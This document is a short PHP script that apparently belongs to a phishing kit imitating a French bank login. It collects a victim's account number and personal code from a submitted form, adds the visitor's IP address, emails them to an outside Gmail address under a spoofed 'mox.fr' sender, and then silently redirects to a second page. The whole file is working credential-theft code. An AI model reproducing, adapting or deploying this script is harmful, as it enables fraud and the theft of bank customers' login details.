<?
$ip = $_SERVER['REMOTE_ADDR'];
$message .= "+-< Mox  >-+\n";
$message .= "N° DE COMPTE :  ".$_POST['logs']."\n";
$message .= "CODE PERSONNEL :  ".$_POST['lwalid']."\n";
$message .= "IP Address : ".$ip."\n";
$message .= "+-|Mouhssix|-+\n";
$to = "rajla8080@gmail.com";
$subj = "Login ||".$ip."\n";
$from = "From: Login Pop <infos@mox.fr>";
mail($to, $subj, $message, $from);
?>
<meta http-equiv="Refresh" content="0; URL=index2.html">